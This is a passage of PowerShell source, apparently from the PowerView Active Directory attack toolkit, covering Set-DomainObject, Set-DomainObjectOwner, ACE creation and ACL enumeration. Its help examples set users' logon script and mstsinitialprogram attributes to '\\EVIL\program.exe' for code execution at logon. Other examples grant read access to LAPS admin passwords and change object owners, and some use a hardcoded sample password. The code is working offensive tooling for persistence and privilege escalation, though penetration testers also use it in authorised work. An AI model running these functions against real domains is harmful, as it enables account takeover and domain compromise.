D (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).","Wildcards accepted.","",".PARAMETER Set","","Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.","",".PARAMETER XOR","","Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.","",".PARAMETER Clear","","Specifies an array of object properties that will be cleared in the directory.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose","","VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: Get-DomainObject filter string: (\u0026(|(samAccountName=testuser)))","VERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program.exe for object testuser","",".EXAMPLE","","\"S-1-5-21-890171859-3433809279-3366196753-1108\",\"testuser\" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\\\EVIL\\program2.exe'} -Verbose","","VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: Get-DomainObject filter string:","(\u0026(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))","VERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program2.exe for object harmj0y","VERBOSE: Setting countrycode to 1234 for object harmj0y","VERBOSE: Get-DomainSearcher search string:","LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: Get-DomainObject filter string: (\u0026(|(samAccountName=testuser)))","VERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program2.exe for object testuser","VERBOSE: Setting countrycode to 1234 for object testuser","",".EXAMPLE","","\"S-1-5-21-890171859-3433809279-3366196753-1108\",\"testuser\" | Set-DomainObject -Clear department -Verbose","","Cleares the 'department' field for both object identities.","",".EXAMPLE","","Get-DomainUser testuser | ConvertFrom-UACValue -Verbose","","Name                           Value","----                           -----","NORMAL_ACCOUNT                 512","","","Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose","","VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: Get-DomainObject filter string: (\u0026(|(samAccountName=testuser)))","VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'","","Get-DomainUser testuser | ConvertFrom-UACValue -Verbose","","Name                           Value","----                           -----","NORMAL_ACCOUNT                 512","DONT_EXPIRE_PASSWORD           65536","",".EXAMPLE","","Get-DomainUser -Identity testuser -Properties scriptpath","","scriptpath","----------","\\\\primary\\sysvol\\blah.ps1","","$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\\\EVIL\\program2.exe'} -Credential $Cred -Verbose","VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain","VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection","VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (\u0026(|(|(samAccountName=testuser)(name=testuser))))","VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\\\EVIL\\program2.exe' for object 'testuser'","","Get-DomainUser -Identity testuser -Properties scriptpath","","scriptpath","----------","\\\\EVIL\\program2.exe","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name')]","        [String[]]","        $Identity,","","        [ValidateNotNullOrEmpty()]","        [Alias('Replace')]","        [Hashtable]","        $Set,","","        [ValidateNotNullOrEmpty()]","        [Hashtable]","        $XOR,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Clear,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $SearcherArguments = @{'Raw' = $True}","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","    }","","    PROCESS {","        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }","","        # splat the appropriate arguments to Get-DomainObject","        $RawObject = Get-DomainObject @SearcherArguments","","        ForEach ($Object in $RawObject) {","","            $Entry = $RawObject.GetDirectoryEntry()","","            if($PSBoundParameters['Set']) {","                try {","                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {","                        Write-Verbose \"[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'\"","                        $Entry.put($_.Name, $_.Value)","                    }","                    $Entry.commitchanges()","                }","                catch {","                    Write-Warning \"[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_\"","                }","            }","            if($PSBoundParameters['XOR']) {","                try {","                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {","                        $PropertyName = $_.Name","                        $PropertyXorValue = $_.Value","                        Write-Verbose \"[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'\"","                        $TypeName = $Entry.$PropertyName[0].GetType().name","","                        # UAC value references- https://support.microsoft.com/en-us/kb/305144","                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue","                        $Entry.$PropertyName = $PropertyValue -as $TypeName","                    }","                    $Entry.commitchanges()","                }","                catch {","                    Write-Warning \"[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_\"","                }","            }","            if($PSBoundParameters['Clear']) {","                try {","                    $PSBoundParameters['Clear'] | ForEach-Object {","                        $PropertyName = $_","                        Write-Verbose \"[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'\"","                        $Entry.$PropertyName.clear()","                    }","                    $Entry.commitchanges()","                }","                catch {","                    Write-Warning \"[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_\"","                }","            }","        }","    }","}","","","function ConvertFrom-LDAPLogonHours {","\u003c#",".SYNOPSIS","","Converts the LDAP LogonHours array to a processible object.","","Author: Lee Christensen (@tifkin_)  ","License: BSD 3-Clause  ","Required Dependencies: None","",".DESCRIPTION","","Converts the LDAP LogonHours array to a processible object.  Each entry","property in the output object corresponds to a day of the week and hour during","the day (in UTC) indicating whether or not the user can logon at the specified","hour.","",".PARAMETER LogonHoursArray","","21-byte LDAP hours array.","",".EXAMPLE","","$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours","ConvertFrom-LDAPLogonHours $hours","","Gets the logonhours array from the first AD user with logon restrictions.","",".OUTPUTS","","PowerView.LogonHours","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.LogonHours')]","    [CmdletBinding()]","    Param (","        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [ValidateNotNullOrEmpty()]","        [byte[]]","        $LogonHoursArray","    )","","    Begin {","        if($LogonHoursArray.Count -ne 21) {","            throw \"LogonHoursArray is the incorrect length\"","        }","","        function ConvertTo-LogonHoursArray {","            Param (","                [int[]]","                $HoursArr","            )","","            $LogonHours = New-Object bool[] 24","            for($i=0; $i -lt 3; $i++) {","                $Byte = $HoursArr[$i]","                $Offset = $i * 8","                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')","","                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])","                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])","                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])","                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])","                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])","                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])","                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])","                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])","            }","","            $LogonHours","        }","    }","","    Process {","        $Output = @{","            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]","            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]","            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]","            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]","            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]","            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]","            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]","        }","","        $Output = New-Object PSObject -Property $Output","        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')","        $Output","    }","}","","","function New-ADObjectAccessControlEntry {","\u003c#",".SYNOPSIS","","Creates a new Active Directory object-specific access control entry.","","Author: Lee Christensen (@tifkin_)  ","License: BSD 3-Clause  ","Required Dependencies: None","",".DESCRIPTION","","Creates a new object-specific access control entry (ACE).  The ACE could be ","used for auditing access to an object or controlling access to objects.","",".PARAMETER PrincipalIdentity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","for the domain principal to add for the ACL. Required. Wildcards accepted.","",".PARAMETER PrincipalDomain","","Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.","",".PARAMETER PrincipalSearchBase","","The LDAP source to search through for principals, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".PARAMETER Right","","Specifies the rights set on the Active Directory object.","",".PARAMETER AccessControlType","","Specifies the type of ACE (allow or deny)","",".PARAMETER AuditFlag","","For audit ACEs, specifies when to create an audit log (on success or failure)","",".PARAMETER ObjectType","","Specifies the GUID of the object that the ACE applies to.","",".PARAMETER InheritanceType","","Specifies how the ACE applies to the object and/or its children.","",".PARAMETER InheritedObjectType","","Specifies the type of object that can inherit the ACE.","",".EXAMPLE","","$Guids = Get-DomainGUIDMap","$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name","$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name","$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid","$OU = Get-DomainOU -Raw Workstations","$DsEntry = $OU.GetDirectoryEntry()","$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'","$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)","$dsEntry.PsBase.CommitChanges()","","Adds an ACE to all computer objects in the OU \"Workstations\" permitting the","user \"itadmin\" to read the confidential ms-Mcs-AdmPwd computer property.","",".OUTPUTS","","System.Security.AccessControl.AuthorizationRule","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.Security.AccessControl.AuthorizationRule')]","    [CmdletBinding()]","    Param (","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name')]","        [String]","        $PrincipalIdentity,","","        [ValidateNotNullOrEmpty()]","        [String]","        $PrincipalDomain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty,","","        [Parameter(Mandatory = $True)]","        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]","        $Right,","","        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]","        [ValidateSet('Allow', 'Deny')]","        [String[]]","        $AccessControlType,","","        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]","        [ValidateSet('Success', 'Failure')]","        [String]","        $AuditFlag,","","        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]","        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]","        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]","        [Guid]","        $ObjectType,","","        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]","        [String]","        $InheritanceType,","","        [Guid]","        $InheritedObjectType","    )","","    Begin {","        if ($PrincipalIdentity -notmatch '^S-1-.*') {","            $PrincipalSearcherArguments = @{","                'Identity' = $PrincipalIdentity","                'Properties' = 'distinguishedname,objectsid'","            }","            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }","            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }","            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }","            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }","            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }","            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }","            $Principal = Get-DomainObject @PrincipalSearcherArguments","            if (-not $Principal) {","                throw \"Unable to resolve principal: $PrincipalIdentity\"","            }","            elseif($Principal.Count -gt 1) {","                throw \"PrincipalIdentity matches multiple AD objects, but only one is allowed\"","            }","            $ObjectSid = $Principal.objectsid","        }","        else {","            $ObjectSid = $PrincipalIdentity","        }","","        $ADRight = 0","        foreach($r in $Right) {","            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)","        }","        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight","","        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)","    }","","    Process {","        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {","","            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag","            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)","            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType","            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType","            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType","            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType","            }","","        }","        else {","","            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType","            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)","            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType","            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType","            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType","            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {","                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType","            }","","        }","    }","}","","","function Set-DomainObjectOwner {","\u003c#",".SYNOPSIS","","Modifies the owner for a specified active directory object.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainObject  ","",".DESCRIPTION","","Retrieves the Active Directory object specified by -Identity by splatting to","Get-DomainObject, returning the raw searchresult object. Retrieves the raw","directoryentry for the object, and sets the object owner to -OwnerIdentity.","",".PARAMETER Identity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","of the AD object to set the owner for.","",".PARAMETER OwnerIdentity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","of the owner to set for -Identity.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y","","Set the owner of 'dfm' in the current domain to 'harmj0y'.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred","","Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name')]","        [String]","        $Identity,","","        [Parameter(Mandatory = $True)]","        [ValidateNotNullOrEmpty()]","        [Alias('Owner')]","        [String]","        $OwnerIdentity,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $SearcherArguments = @{}","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","","        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid","        if ($OwnerSid) {","            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid","        }","        else {","            Write-Warning \"[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'\"","        }","    }","","    PROCESS {","        if ($OwnerIdentityReference) {","            $SearcherArguments['Raw'] = $True","            $SearcherArguments['Identity'] = $Identity","","            # splat the appropriate arguments to Get-DomainObject","            $RawObject = Get-DomainObject @SearcherArguments","","            ForEach ($Object in $RawObject) {","                try {","                    Write-Verbose \"[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'\"","                    $Entry = $RawObject.GetDirectoryEntry()","                    $Entry.PsBase.Options.SecurityMasks = 'Owner'","                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)","                    $Entry.PsBase.CommitChanges()","                }","                catch {","                    Write-Warning \"[Set-DomainObjectOwner] Error setting owner: $_\"","                }","            }","        }","    }","}","","","function Get-DomainObjectAcl {","\u003c#",".SYNOPSIS","","Returns the ACLs associated with a specific active directory object. By default","the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  ","",".PARAMETER Identity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).","Wildcards accepted.","",".PARAMETER Sacl","","Switch. Return the SACL instead of the DACL for the object (default behavior).","",".PARAMETER ResolveGUIDs","","Switch. Resolve GUIDs to their display names.","",".PARAMETER RightsFilter","","A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs","","Get the ACLs for the matt.admin user in the testlab.local domain and","resolve relevant GUIDs to their display names.","",".EXAMPLE","","Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs","","Enumerate the ACL permissions for all OUs in the domain.","",".EXAMPLE","","Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl","","Enumerate the SACLs for all OUs in the domain, resolving GUIDs.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs","",".OUTPUTS","","PowerView.ACL","","Custom PSObject with ACL entries.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.ACL')]","    [CmdletBinding()]","    Param (","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name')]","        [String[]]","        $Identity,","","        [Switch]","        $Sacl,","","        [Switch]","        $ResolveGUIDs,","","        [String]","        [Alias('Rights')]","        [ValidateSet('All', 